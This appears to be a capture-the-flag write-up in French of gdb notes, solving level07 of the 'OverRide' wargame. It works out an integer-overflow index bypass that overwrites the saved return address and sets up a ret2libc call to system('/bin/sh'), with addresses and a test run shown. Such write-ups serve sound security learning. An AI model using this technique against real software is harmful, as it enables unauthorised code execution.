@@ -1,0 +1,753 @@
+Breakpoint 2, 0x08048630 in store_number ()
+(gdb) disas store_number
+Dump of assembler code for function store_number:
+=> 0x08048630 <+0>:	push   ebp
+   0x08048631 <+1>:	mov    ebp,esp
+   0x08048633 <+3>:	sub    esp,0x28
+   0x08048636 <+6>:	mov    DWORD PTR [ebp-0x10],0x0
+   0x0804863d <+13>:	mov    DWORD PTR [ebp-0xc],0x0
+   0x08048644 <+20>:	mov    eax,0x8048ad3
+   0x08048649 <+25>:	mov    DWORD PTR [esp],eax
+   0x0804864c <+28>:	call   0x8048470 <printf@plt>
+   0x08048651 <+33>:	call   0x80485e7 <get_unum>
+   0x08048656 <+38>:	mov    DWORD PTR [ebp-0x10],eax
+   0x08048659 <+41>:	mov    eax,0x8048add
+   0x0804865e <+46>:	mov    DWORD PTR [esp],eax
+   0x08048661 <+49>:	call   0x8048470 <printf@plt>
+   0x08048666 <+54>:	call   0x80485e7 <get_unum>
+   0x0804866b <+59>:	mov    DWORD PTR [ebp-0xc],eax
+   0x0804866e <+62>:	mov    ecx,DWORD PTR [ebp-0xc]
+   0x08048671 <+65>:	mov    edx,0xaaaaaaab
+   0x08048676 <+70>:	mov    eax,ecx
+   0x08048678 <+72>:	mul    edx
+   0x0804867a <+74>:	shr    edx,1
+   0x0804867c <+76>:	mov    eax,edx
+   0x0804867e <+78>:	add    eax,eax
+   0x08048680 <+80>:	add    eax,edx
+   0x08048682 <+82>:	mov    edx,ecx
+   0x08048684 <+84>:	sub    edx,eax
+   0x08048686 <+86>:	test   edx,edx
+   0x08048688 <+88>:	je     0x8048697 <store_number+103>
+   0x0804868a <+90>:	mov    eax,DWORD PTR [ebp-0x10]
+   0x0804868d <+93>:	shr    eax,0x18
+   0x08048690 <+96>:	cmp    eax,0xb7
+   0x08048695 <+101>:	jne    0x80486c2 <store_number+146>
+   0x08048697 <+103>:	mov    DWORD PTR [esp],0x8048ae6
+   0x0804869e <+110>:	call   0x80484c0 <puts@plt>
+   0x080486a3 <+115>:	mov    DWORD PTR [esp],0x8048af8
+   0x080486aa <+122>:	call   0x80484c0 <puts@plt>
+   0x080486af <+127>:	mov    DWORD PTR [esp],0x8048ae6
+   0x080486b6 <+134>:	call   0x80484c0 <puts@plt>
+   0x080486bb <+139>:	mov    eax,0x1
+   0x080486c0 <+144>:	jmp    0x80486d5 <store_number+165>
+   0x080486c2 <+146>:	mov    eax,DWORD PTR [ebp-0xc]
+   0x080486c5 <+149>:	shl    eax,0x2
+   0x080486c8 <+152>:	add    eax,DWORD PTR [ebp+0x8]
+   0x080486cb <+155>:	mov    edx,DWORD PTR [ebp-0x10]
+   0x080486ce <+158>:	mov    DWORD PTR [eax],edx
+   0x080486d0 <+160>:	mov    eax,0x0
+   0x080486d5 <+165>:	leave
+   0x080486d6 <+166>:	ret
+End of assembler dump.
+
+(gdb) p/d
+$6 = 1073741824
+
+(gdb) p/d 0x18
+$7 = 24
+
+(gdb) p/d 0xb7
+$8 = 183
+
+(gdb) x/s 0x8048ae6
+0x8048ae6:	 " *** ERROR! ***"
+
+(gdb) x/s 0x8048af8
+0x8048af8:	 "   This index is reserved for wil!"
+
+(gdb) x/s 0x8048ae6
+0x8048ae6:	 " *** ERROR! ***"
+
+(gdb) info frame
+Stack level 0, frame at 0xffffd500:
+ eip = 0x8048630 in store_number; saved eip 0x80488ef
+ called by frame at 0xffffd6f0
+ Arglist at 0xffffd4f8, args:
+ Locals at 0xffffd4f8, Previous frame's sp is 0xffffd500
+ Saved registers:
+  eip at 0xffffd4fc
+
+(gdb) x/xw 0xffffd4fc
+0xffffd4fc:	0x080488ef
+
+(gdb) x/xw 0x080488ef
+0x80488ef <main+460>:	0xb4248489
+
+****** On va avancer dans store_number *******
+
+(gdb) x/10x $ebp+0x10
+0xffffd6f8:	0xffffd78c	0xf7fd3000	0x00000000	0xffffd71c
+0xffffd708:	0xffffd78c	0x00000000	0x080482b8	0xf7fceff4
+0xffffd718:	0x00000000	0x00000000
+(gdb) b *0x080486c2
+Breakpoint 3 at 0x80486c2
+(gdb) c
+Continuing.
+ Number: 666
+ Index: 1
+
+Breakpoint 3, 0x080486c2 in store_number ()
+(gdb) disas store_number
+Dump of assembler code for function store_number:
+   0x08048630 <+0>:	push   ebp
+   0x08048631 <+1>:	mov    ebp,esp
+   0x08048633 <+3>:	sub    esp,0x28
+   0x08048636 <+6>:	mov    DWORD PTR [ebp-0x10],0x0
+   0x0804863d <+13>:	mov    DWORD PTR [ebp-0xc],0x0
+   0x08048644 <+20>:	mov    eax,0x8048ad3
+   0x08048649 <+25>:	mov    DWORD PTR [esp],eax
+   0x0804864c <+28>:	call   0x8048470 <printf@plt>
+   0x08048651 <+33>:	call   0x80485e7 <get_unum>
+   0x08048656 <+38>:	mov    DWORD PTR [ebp-0x10],eax
+   0x08048659 <+41>:	mov    eax,0x8048add
+   0x0804865e <+46>:	mov    DWORD PTR [esp],eax
+   0x08048661 <+49>:	call   0x8048470 <printf@plt>
+   0x08048666 <+54>:	call   0x80485e7 <get_unum>
+   0x0804866b <+59>:	mov    DWORD PTR [ebp-0xc],eax
+   0x0804866e <+62>:	mov    ecx,DWORD PTR [ebp-0xc]
+   0x08048671 <+65>:	mov    edx,0xaaaaaaab
+   0x08048676 <+70>:	mov    eax,ecx
+   0x08048678 <+72>:	mul    edx
+   0x0804867a <+74>:	shr    edx,1
+   0x0804867c <+76>:	mov    eax,edx
+   0x0804867e <+78>:	add    eax,eax
+   0x08048680 <+80>:	add    eax,edx
+   0x08048682 <+82>:	mov    edx,ecx
+   0x08048684 <+84>:	sub    edx,eax
+   0x08048686 <+86>:	test   edx,edx
+   0x08048688 <+88>:	je     0x8048697 <store_number+103>
+   0x0804868a <+90>:	mov    eax,DWORD PTR [ebp-0x10]
+   0x0804868d <+93>:	shr    eax,0x18
+   0x08048690 <+96>:	cmp    eax,0xb7
+   0x08048695 <+101>:	jne    0x80486c2 <store_number+146>
+   0x08048697 <+103>:	mov    DWORD PTR [esp],0x8048ae6
+   0x0804869e <+110>:	call   0x80484c0 <puts@plt>
+   0x080486a3 <+115>:	mov    DWORD PTR [esp],0x8048af8
+   0x080486aa <+122>:	call   0x80484c0 <puts@plt>
+   0x080486af <+127>:	mov    DWORD PTR [esp],0x8048ae6
+   0x080486b6 <+134>:	call   0x80484c0 <puts@plt>
+   0x080486bb <+139>:	mov    eax,0x1
+   0x080486c0 <+144>:	jmp    0x80486d5 <store_number+165>
+=> 0x080486c2 <+146>:	mov    eax,DWORD PTR [ebp-0xc]
+   0x080486c5 <+149>:	shl    eax,0x2
+   0x080486c8 <+152>:	add    eax,DWORD PTR [ebp+0x8]
+   0x080486cb <+155>:	mov    edx,DWORD PTR [ebp-0x10]
+   0x080486ce <+158>:	mov    DWORD PTR [eax],edx
+   0x080486d0 <+160>:	mov    eax,0x0
+   0x080486d5 <+165>:	leave
+   0x080486d6 <+166>:	ret
+End of assembler dump.
+(gdb) x/x $ebp-0xc
+0xffffd4ec:	0x00000001
+(gdb) x/x $ebp-0x8
+0xffffd4f0:	0x00000000
+(gdb) x/x $ebp-0x10
+0xffffd4e8:	0x0000029a
+(gdb) b *0x080486ce
+Breakpoint 4 at 0x80486ce
+(gdb) c
+Continuing.
+
+Breakpoint 4, 0x080486ce in store_number ()
+(gdb) i r edx
+edx            0x29a	666
+(gdb) i r eax
+eax            0xffffd528	-10968
+(gdb) x/x 0xffffd528
+0xffffd528:	0x00000000
+(gdb) b *0x080486d0
+Breakpoint 5 at 0x80486d0
+(gdb) c
+Continuing.
+
+Breakpoint 5, 0x080486d0 in store_number ()
+(gdb) x/x 0xffffd528
+0xffffd528:	0x0000029a
+(gdb) x/d 0xffffd528
+0xffffd528:	666
+
+ => En fait l'adresse du tableau est envoyer en parametre au fonction store et read
+
+
+************************************************
+****************** SOLUTION ********************
+************************************************
+
+
+************************************************
+****** 1 - Trouver l'adresse du tableau ********
+************************************************
+
+   0x080488e1 <+446>:	jne    0x80488f8 <main+469>
+   0x080488e3 <+448>:	lea    eax,[esp+0x24]
+   0x080488e7 <+452>:	mov    DWORD PTR [esp],eax
+=> 0x080488ea <+455>:	call   0x8048630 <store_number>
+   0x080488ef <+460>:	mov    DWORD PTR [esp+0x1b4],eax
+   0x080488f6 <+467>:	jmp    0x8048965 <main+578>
+   0x080488f8 <+469>:	lea    eax,[esp+0x1b8]
+   0x080488ff <+476>:	mov    edx,eax
+   0x08048901 <+478>:	mov    eax,0x8048d61
+   0x08048906 <+483>:	mov    ecx,0x4
+   0x0804890b <+488>:	mov    esi,edx
+   0x0804890d <+490>:	mov    edi,eax
+   0x0804890f <+492>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
+   0x08048911 <+494>:	seta   dl
+   0x08048914 <+497>:	setb   al
+---Type <return> to continue, or q <return> to quit---q
+Quit
+(gdb) i r eax
+eax            0xffffd524	-10972
+
+************************************************
+****** 2 -  Trouver l'offset jusqu'à eip *******
+************************************************
+
+Breakpoint 6, 0x080488ea in main ()
+(gdb) disas main
+Dump of assembler code for function main:
+   0x08048723 <+0>:	push   ebp
+   ...
+=> 0x080488ea <+455>:	call   0x8048630 <store_number>
+   ...
+
+(gdb) i r eax
+eax            0xffffd524	-10972			=> adresse du tableau
+
+(gdb) info frame							=> Pour trouver l'adresse de eip
+Stack level 0, frame at 0xffffd6f0:
+ eip = 0x80488ea in main; saved eip 0xf7e45513
+ Arglist at 0xffffd6e8, args:
+ Locals at 0xffffd6e8, Previous frame's sp is 0xffffd6f0
+ Saved registers:
+  ebx at 0xffffd6dc, ebp at 0xffffd6e8, esi at 0xffffd6e0, edi at 0xffffd6e4, eip at 0xffffd6ec		=> adresse de eip
+
+(gdb) p/d 0xffffd6ec - 0xffffd524
+$16 = 456									=> On a maintenant l'offset de l'adresse du tableau jusqu'à la l'adresse de sauvegarde eip
+
+(gdb) p/d 456/4
+$17 = 114									=> On a maintenant l'index du tableau
+
+=> il faut donc écrire sur tab[114] pour overwrite eip et exploiter le binaire
+
+
+*********************************************************************************
+*********** TEST QUAND ON STORE POUR VOIR COMMENT FONCTIONNE L'INDEX ************
+*********************************************************************************
+
+(gdb) r
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/users/level07/level07
+----------------------------------------------------
+  Welcome to wil's crappy number storage service!
+----------------------------------------------------
+ Commands:
+    store - store a number into the data storage
+    read  - read a number from the data storage
+    quit  - exit the program
+----------------------------------------------------
+   wil has reserved some storage :>
+----------------------------------------------------
+
+Input command: store
+ Number: 666
+ Index: 2
+
+Breakpoint 1, 0x080486c2 in store_number ()
+(gdb) i r eax
+eax            0x0	0
+(gdb) u
+0x080486c5 in store_number ()
+(gdb) i r eax
+eax            0x2	2
+(gdb) disas store_number
+Dump of assembler code for function store_number:
+   0x08048630 <+0>:	push   ebp
+   0x08048631 <+1>:	mov    ebp,esp
+   0x08048633 <+3>:	sub    esp,0x28
+   0x08048636 <+6>:	mov    DWORD PTR [ebp-0x10],0x0
+   0x0804863d <+13>:	mov    DWORD PTR [ebp-0xc],0x0
+   0x08048644 <+20>:	mov    eax,0x8048ad3
+   0x08048649 <+25>:	mov    DWORD PTR [esp],eax
+   0x0804864c <+28>:	call   0x8048470 <printf@plt>
+   0x08048651 <+33>:	call   0x80485e7 <get_unum>
+   0x08048656 <+38>:	mov    DWORD PTR [ebp-0x10],eax
+   0x08048659 <+41>:	mov    eax,0x8048add
+   0x0804865e <+46>:	mov    DWORD PTR [esp],eax
+   0x08048661 <+49>:	call   0x8048470 <printf@plt>
+   0x08048666 <+54>:	call   0x80485e7 <get_unum>
+   0x0804866b <+59>:	mov    DWORD PTR [ebp-0xc],eax
+   0x0804866e <+62>:	mov    ecx,DWORD PTR [ebp-0xc]
+   0x08048671 <+65>:	mov    edx,0xaaaaaaab
+   0x08048676 <+70>:	mov    eax,ecx
+   0x08048678 <+72>:	mul    edx
+   0x0804867a <+74>:	shr    edx,1
+   0x0804867c <+76>:	mov    eax,edx
+   0x0804867e <+78>:	add    eax,eax
+   0x08048680 <+80>:	add    eax,edx
+   0x08048682 <+82>:	mov    edx,ecx
+   0x08048684 <+84>:	sub    edx,eax
+   0x08048686 <+86>:	test   edx,edx
+   0x08048688 <+88>:	je     0x8048697 <store_number+103>
+   0x0804868a <+90>:	mov    eax,DWORD PTR [ebp-0x10]
+   0x0804868d <+93>:	shr    eax,0x18
+   0x08048690 <+96>:	cmp    eax,0xb7
+   0x08048695 <+101>:	jne    0x80486c2 <store_number+146>
+   0x08048697 <+103>:	mov    DWORD PTR [esp],0x8048ae6
+   0x0804869e <+110>:	call   0x80484c0 <puts@plt>
+   0x080486a3 <+115>:	mov    DWORD PTR [esp],0x8048af8
+   0x080486aa <+122>:	call   0x80484c0 <puts@plt>
+   0x080486af <+127>:	mov    DWORD PTR [esp],0x8048ae6
+   0x080486b6 <+134>:	call   0x80484c0 <puts@plt>
+   0x080486bb <+139>:	mov    eax,0x1
+   0x080486c0 <+144>:	jmp    0x80486d5 <store_number+165>
+   0x080486c2 <+146>:	mov    eax,DWORD PTR [ebp-0xc]
+=> 0x080486c5 <+149>:	shl    eax,0x2
+   0x080486c8 <+152>:	add    eax,DWORD PTR [ebp+0x8]
+   0x080486cb <+155>:	mov    edx,DWORD PTR [ebp-0x10]
+   0x080486ce <+158>:	mov    DWORD PTR [eax],edx
+   0x080486d0 <+160>:	mov    eax,0x0
+   0x080486d5 <+165>:	leave
+   0x080486d6 <+166>:	ret
+End of assembler dump.
+(gdb) u
+0x080486c8 in store_number ()
+(gdb) i r eax
+eax            0x8	8
+(gdb) u
+0x080486cb in store_number ()
+(gdb) i r eax
+eax            0xffffd52c	-10964
+(gdb) p/x 0xffffd524 + 8				adresse tab + 8(input * 4)
+$13 = 0xffffd52c
+(gdb) u
+0x080486ce in store_number ()
+(gdb) info frame
+Stack level 0, frame at 0xffffd500:
+ eip = 0x80486ce in store_number; saved eip 0x80488ef
+ called by frame at 0xffffd6f0
+ Arglist at 0xffffd4f8, args:
+ Locals at 0xffffd4f8, Previous frame's sp is 0xffffd500
+ Saved registers:
+  ebp at 0xffffd4f8, eip at 0xffffd4fc
+(gdb) i r
+eax            0xffffd52c	-10964
+ecx            0x2	2
+edx            0x29a	666
+ebx            0xffffd524	-10972
+esp            0xffffd4d0	0xffffd4d0
+ebp            0xffffd4f8	0xffffd4f8
+esi            0xffffd6bd	-10563
+edi            0x8048d60	134516064
+eip            0x80486ce	0x80486ce <store_number+158>
+eflags         0x282	[ SF IF ]
+cs             0x23	35
+ss             0x2b	43
+ds             0x2b	43
+es             0x2b	43
+fs             0x0	0
+gs             0x63	99
+
+
+******* TEST OVERFLOW *******
+(gdb) p/d 0xffffffff + 1
+$31 = 0
+
+(gdb) p/d 0xfffffffff + 1
+$32 = 68719476736
+
+(gdb) p/d 4294967295 + 1
+$33 = 0
+
+(gdb) p/d 0xaaaaaaab
+$37 = 2863311531
+(gdb)
+
+
+********* On trouve un overflow apres le get_unum 
+
+Input command: store
+ Number: 666
+ Index: 123123123123123
+
+Breakpoint 2, 0x0804866e in store_number ()
+(gdb) disas store_number
+Dump of assembler code for function store_number:
+   0x08048630 <+0>:	push   ebp
+   0x08048631 <+1>:	mov    ebp,esp
+   0x08048633 <+3>:	sub    esp,0x28
+   0x08048636 <+6>:	mov    DWORD PTR [ebp-0x10],0x0
+   0x0804863d <+13>:	mov    DWORD PTR [ebp-0xc],0x0
+   0x08048644 <+20>:	mov    eax,0x8048ad3
+   0x08048649 <+25>:	mov    DWORD PTR [esp],eax
+   0x0804864c <+28>:	call   0x8048470 <printf@plt>
+   0x08048651 <+33>:	call   0x80485e7 <get_unum>
+   0x08048656 <+38>:	mov    DWORD PTR [ebp-0x10],eax
+   0x08048659 <+41>:	mov    eax,0x8048add
+   0x0804865e <+46>:	mov    DWORD PTR [esp],eax
+   0x08048661 <+49>:	call   0x8048470 <printf@plt>
+   0x08048666 <+54>:	call   0x80485e7 <get_unum>
+   0x0804866b <+59>:	mov    DWORD PTR [ebp-0xc],eax
+=> 0x0804866e <+62>:	mov    ecx,DWORD PTR [ebp-0xc]
+   0x08048671 <+65>:	mov    edx,0xaaaaaaab
+   0x08048676 <+70>:	mov    eax,ecx
+   0x08048678 <+72>:	mul    edx
+   0x0804867a <+74>:	shr    edx,1
+   0x0804867c <+76>:	mov    eax,edx
+   0x0804867e <+78>:	add    eax,eax
+   0x08048680 <+80>:	add    eax,edx
+   0x08048682 <+82>:	mov    edx,ecx
+   0x08048684 <+84>:	sub    edx,eax
+   0x08048686 <+86>:	test   edx,edx
+   0x08048688 <+88>:	je     0x8048697 <store_number+103>
+   0x0804868a <+90>:	mov    eax,DWORD PTR [ebp-0x10]
+   0x0804868d <+93>:	shr    eax,0x18
+   0x08048690 <+96>:	cmp    eax,0xb7
+   0x08048695 <+101>:	jne    0x80486c2 <store_number+146>
+   0x08048697 <+103>:	mov    DWORD PTR [esp],0x8048ae6
+   0x0804869e <+110>:	call   0x80484c0 <puts@plt>
+   0x080486a3 <+115>:	mov    DWORD PTR [esp],0x8048af8
+   0x080486aa <+122>:	call   0x80484c0 <puts@plt>
+   0x080486af <+127>:	mov    DWORD PTR [esp],0x8048ae6
+   0x080486b6 <+134>:	call   0x80484c0 <puts@plt>
+   0x080486bb <+139>:	mov    eax,0x1
+   0x080486c0 <+144>:	jmp    0x80486d5 <store_number+165>
+   0x080486c2 <+146>:	mov    eax,DWORD PTR [ebp-0xc]
+   0x080486c5 <+149>:	shl    eax,0x2
+   0x080486c8 <+152>:	add    eax,DWORD PTR [ebp+0x8]
+   0x080486cb <+155>:	mov    edx,DWORD PTR [ebp-0x10]
+   0x080486ce <+158>:	mov    DWORD PTR [eax],edx
+   0x080486d0 <+160>:	mov    eax,0x0
+   0x080486d5 <+165>:	leave
+   0x080486d6 <+166>:	ret
+End of assembler dump.
+(gdb) x/d $ebp-0xc
+0xffffd4ec:	-1
+(gdb)
+
+
+****************************************************************************************
+********* Maintenant on va chercher les adresses necessaires pour un ret2libc **********
+****************************************************************************************
+
+(gdb) b *main
+Breakpoint 3 at 0x8048723
+
+(gdb) info exit
+Undefined info command: "exit".  Try "help info".
+
+(gdb) print exit
+$53 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
+
+(gdb) info function exit
+All functions matching regular expression "exit":
+
+Non-debugging symbols:
+0xf7e5eb70  exit
+0xf7e5eba0  on_exit
+0xf7e5edb0  __cxa_atexit
+0xf7e5ef50  quick_exit
+0xf7e5ef80  __cxa_at_quick_exit
+0xf7ee45c4  _exit
+0xf7f27ec0  pthread_exit
+0xf7f2d4f0  __cyg_profile_func_exit
+0xf7f4bc30  svc_exit
+0xf7f55d80  atexit
+
+(gdb) print system
+$54 = {<text variable, no debug info>} 0xf7e6aed0 <system>
+
+(gdb) print "/bin/sh"
+$55 = "/bin/sh"
+
+(gdb) print (int*)"/bin/sh"
+$56 = (int *) 0x804b008
+
+(gdb) x/s 0x804b008
+0x804b008:	 "/bin/sh"
+
+(gdb) info proc map
+process 15643
+Mapped address spaces:
+
+	Start Addr   End Addr       Size     Offset objfile
+	 0x8048000  0x8049000     0x1000        0x0 /home/users/level07/level07
+	 0x8049000  0x804a000     0x1000     0x1000 /home/users/level07/level07
+	 0x804a000  0x804b000     0x1000     0x2000 /home/users/level07/level07
+	 0x804b000  0x806c000    0x21000        0x0 [heap]
+	0xf7e2b000 0xf7e2c000     0x1000        0x0
+	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
+	0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
+	0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
+	0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
+	0xf7fd0000 0xf7fd4000     0x4000        0x0
+	0xf7fd8000 0xf7fdb000     0x3000        0x0
+	0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
+	0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
+	0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
+	0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
+	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
+(gdb) find __libc_start_main,+99999999,"/bin/sh"
+0xf7f897ec
+warning: Unable to access target memory at 0xf7fd3b74, halting search.
+1 pattern found.
+(gdb)
+
+******** Pour finir il faut qu'on stock
+
+tab[114] = 0xf7e6aed0 <system> = 4159090384
+tab[115] = 0xf7e5eb70 <exit> = 4159040368
+tab[116] = 0xf7f897ec "/bin/sh" = 4160264172
+
+(gdb) p/d 0xf7e6aed0
+$58 = 4159090384
+
+(gdb) p/d 0xf7e5eb70
+$59 = 4159040368
+
+(gdb) p/d 0xf7f897ec
+$60 = 4160264172
+
+(gdb) p/d 115 % 3
+$61 = 1
+(gdb) p/d 116 % 3
+$62 = 2
+(gdb) p/d 114 % 3
+$63 = 0
+Mais
+(gdb) p/d -2147483534 % 3
+$70 = -2
+
+Donc on a juste a overflow sur le 114 => -2147483534 (114 + UINT_MAX / 2 + 1) qui fait en overflow (114 -1 + 1) = 114
+
+
+***********************************
+********* PARTIE OVERFLOW *********
+***********************************
+
+On sait que UNIT_MAX donne un overflow de -1 sur un int
+1 - Il faut que notre index total à overflow rentre dans un int pour le get_unum ou bien il va overflow trop top
+2 - Il faut qu'il soit assez grand pour overflow quand on va le multiplier par 4
+ -> on va donc prendre UINT_MAX / 2 = -2147483534
+Ensuite le calcule de l'index est le suivant *(uint *)(input * 4 + param_1)
+	input: notre input 'index'
+	* 4
+	+ param_1: qui est l'adresse du tableau
+Cad que si on met 114 notre input 'nombre' sera écrit à l'adresse 'adresse_tableau + input_index * 4' => 'adresse_tableau + 114 * 4' => tableau + 456 (adresse eip)
+Sauf que on a le blocage % 3 == 0 => error only for will 
+Donc si UNIT_MAX = -1 en int overflow
+En l'exploitant sa nous donne adresse_tableau + input_index * 4, on remplace input_index par notre expression 
+adresse_tableau + ((114 + UINT_MAX / 2 + 1) * 4)) 
+= adresse_tableau + ((114 + (-1) + 1) * 4)) 
+= 'adresse_tableau + 114 * 4' => tableau + 456 (adresse eip)
+
+(gdb) p 0xffffffff
+$53 = 4294967295
+(gdb) p 4294967295 / 2 + 1
+$54 = 2147483648
+(gdb) p 4294967295 / 2 + 1 + 114
+$55 = 2147483762
+
+Input command: store
+ Number: 43
+ Index: 2147483762
+(gdb) disas store_number
+Dump of assembler code for function store_number:
+   0x08048630 <+0>:	push   ebp
+   0x08048631 <+1>:	mov    ebp,esp
+   0x08048633 <+3>:	sub    esp,0x28
+   0x08048636 <+6>:	mov    DWORD PTR [ebp-0x10],0x0
+   0x0804863d <+13>:	mov    DWORD PTR [ebp-0xc],0x0
+   0x08048644 <+20>:	mov    eax,0x8048ad3
+   0x08048649 <+25>:	mov    DWORD PTR [esp],eax
+   0x0804864c <+28>:	call   0x8048470 <printf@plt>
+   0x08048651 <+33>:	call   0x80485e7 <get_unum>
+   0x08048656 <+38>:	mov    DWORD PTR [ebp-0x10],eax
+   0x08048659 <+41>:	mov    eax,0x8048add
+   0x0804865e <+46>:	mov    DWORD PTR [esp],eax
+   0x08048661 <+49>:	call   0x8048470 <printf@plt>
+   0x08048666 <+54>:	call   0x80485e7 <get_unum>
+   0x0804866b <+59>:	mov    DWORD PTR [ebp-0xc],eax
+   0x0804866e <+62>:	mov    ecx,DWORD PTR [ebp-0xc]
+   0x08048671 <+65>:	mov    edx,0xaaaaaaab
+   0x08048676 <+70>:	mov    eax,ecx
+   0x08048678 <+72>:	mul    edx
+   0x0804867a <+74>:	shr    edx,1
+   0x0804867c <+76>:	mov    eax,edx
+   0x0804867e <+78>:	add    eax,eax
+   0x08048680 <+80>:	add    eax,edx
+   0x08048682 <+82>:	mov    edx,ecx
+   0x08048684 <+84>:	sub    edx,eax
+   0x08048686 <+86>:	test   edx,edx
+   0x08048688 <+88>:	je     0x8048697 <store_number+103>
+   0x0804868a <+90>:	mov    eax,DWORD PTR [ebp-0x10]
+   0x0804868d <+93>:	shr    eax,0x18
+   0x08048690 <+96>:	cmp    eax,0xb7
+   0x08048695 <+101>:	jne    0x80486c2 <store_number+146>
+   0x08048697 <+103>:	mov    DWORD PTR [esp],0x8048ae6
+   0x0804869e <+110>:	call   0x80484c0 <puts@plt>
+   0x080486a3 <+115>:	mov    DWORD PTR [esp],0x8048af8
+   0x080486aa <+122>:	call   0x80484c0 <puts@plt>
+   0x080486af <+127>:	mov    DWORD PTR [esp],0x8048ae6
+   0x080486b6 <+134>:	call   0x80484c0 <puts@plt>
+   0x080486bb <+139>:	mov    eax,0x1
+   0x080486c0 <+144>:	jmp    0x80486d5 <store_number+165>
+   0x080486c2 <+146>:	mov    eax,DWORD PTR [ebp-0xc]
+   0x080486c5 <+149>:	shl    eax,0x2
+=> 0x080486c8 <+152>:	add    eax,DWORD PTR [ebp+0x8]
+   0x080486cb <+155>:	mov    edx,DWORD PTR [ebp-0x10]
+   0x080486ce <+158>:	mov    DWORD PTR [eax],edx
+   0x080486d0 <+160>:	mov    eax,0x0
+   0x080486d5 <+165>:	leave
+   0x080486d6 <+166>:	ret
+End of assembler dump.
+(gdb) p $eax
+$35 = 456
+(gdb) c
+Continuing.
+ Completed store command successfully
+Input command: read
+ Index: 114
+ Number at data[114] is 43
+ Completed read command successfully
+Input command: quit
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000002b in ?? ()
+(gdb) info frame
+Stack level 0, frame at 0x0:
+ eip = 0x2b; saved eip 0x2b
+ Outermost frame: outermost
+ Arglist at unknown address.
+ Locals at unknown address, Previous frame's sp in esp
+
+************
+*** TEST ***
+************
+
+(gdb) r
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/users/level07/level07
+
+Breakpoint 3, 0x08048723 in main ()
+(gdb) c
+Continuing.
+----------------------------------------------------
+  Welcome to wil's crappy number storage service!
+----------------------------------------------------
+ Commands:
+    store - store a number into the data storage
+    read  - read a number from the data storage
+    quit  - exit the program
+----------------------------------------------------
+   wil has reserved some storage :>
+----------------------------------------------------
+
+Input command: store
+ Number: 666
+ Index: -2147483534
+
+Breakpoint 2, 0x0804866e in store_number ()
+(gdb) disas sotre_number
+No symbol table is loaded.  Use the "file" command.
+(gdb) disas store_number
+Dump of assembler code for function store_number:
+   0x08048630 <+0>:	push   ebp
+   0x08048631 <+1>:	mov    ebp,esp
+   0x08048633 <+3>:	sub    esp,0x28
+   0x08048636 <+6>:	mov    DWORD PTR [ebp-0x10],0x0
+   0x0804863d <+13>:	mov    DWORD PTR [ebp-0xc],0x0
+   0x08048644 <+20>:	mov    eax,0x8048ad3
+   0x08048649 <+25>:	mov    DWORD PTR [esp],eax
+   0x0804864c <+28>:	call   0x8048470 <printf@plt>
+   0x08048651 <+33>:	call   0x80485e7 <get_unum>
+   0x08048656 <+38>:	mov    DWORD PTR [ebp-0x10],eax
+   0x08048659 <+41>:	mov    eax,0x8048add
+   0x0804865e <+46>:	mov    DWORD PTR [esp],eax
+   0x08048661 <+49>:	call   0x8048470 <printf@plt>
+   0x08048666 <+54>:	call   0x80485e7 <get_unum>
+   0x0804866b <+59>:	mov    DWORD PTR [ebp-0xc],eax
+   0x0804866e <+62>:	mov    ecx,DWORD PTR [ebp-0xc]
+=> 0x08048671 <+65>:	mov    edx,0xaaaaaaab
+   0x08048676 <+70>:	mov    eax,ecx
+   0x08048678 <+72>:	mul    edx
+   0x0804867a <+74>:	shr    edx,1
+   0x0804867c <+76>:	mov    eax,edx
+   0x0804867e <+78>:	add    eax,eax
+   0x08048680 <+80>:	add    eax,edx
+   0x08048682 <+82>:	mov    edx,ecx
+   0x08048684 <+84>:	sub    edx,eax
+   0x08048686 <+86>:	test   edx,edx
+   0x08048688 <+88>:	je     0x8048697 <store_number+103>
+   0x0804868a <+90>:	mov    eax,DWORD PTR [ebp-0x10]
+   0x0804868d <+93>:	shr    eax,0x18
+   0x08048690 <+96>:	cmp    eax,0xb7
+   0x08048695 <+101>:	jne    0x80486c2 <store_number+146>
+   0x08048697 <+103>:	mov    DWORD PTR [esp],0x8048ae6
+   0x0804869e <+110>:	call   0x80484c0 <puts@plt>
+   0x080486a3 <+115>:	mov    DWORD PTR [esp],0x8048af8
+   0x080486aa <+122>:	call   0x80484c0 <puts@plt>
+   0x080486af <+127>:	mov    DWORD PTR [esp],0x8048ae6
+   0x080486b6 <+134>:	call   0x80484c0 <puts@plt>
+   0x080486bb <+139>:	mov    eax,0x1
+   0x080486c0 <+144>:	jmp    0x80486d5 <store_number+165>
+   0x080486c2 <+146>:	mov    eax,DWORD PTR [ebp-0xc]
+   0x080486c5 <+149>:	shl    eax,0x2
+   0x080486c8 <+152>:	add    eax,DWORD PTR [ebp+0x8]
+   0x080486cb <+155>:	mov    edx,DWORD PTR [ebp-0x10]
+   0x080486ce <+158>:	mov    DWORD PTR [eax],edx
+   0x080486d0 <+160>:	mov    eax,0x0
+   0x080486d5 <+165>:	leave
+   0x080486d6 <+166>:	ret
+End of assembler dump.
+(gdb) i r eax
+eax            0x80000072	-2147483534
+(gdb) x/d $ebp-0xc
+0xffffd4ec:	-2147483534
+(gdb) i r ecx
+ecx            0x80000072	-2147483534
+
+On voit donc que c'est ecx (-2147483534) qui va etre comparer avec le % 3 or -2147483534 % 3 != 0
+
+
+
+level07@OverRide:~$ ./level07
+----------------------------------------------------
+  Welcome to wil's crappy number storage service!
+----------------------------------------------------
+ Commands:
+    store - store a number into the data storage
+    read  - read a number from the data storage
+    quit  - exit the program
+----------------------------------------------------
+   wil has reserved some storage :>
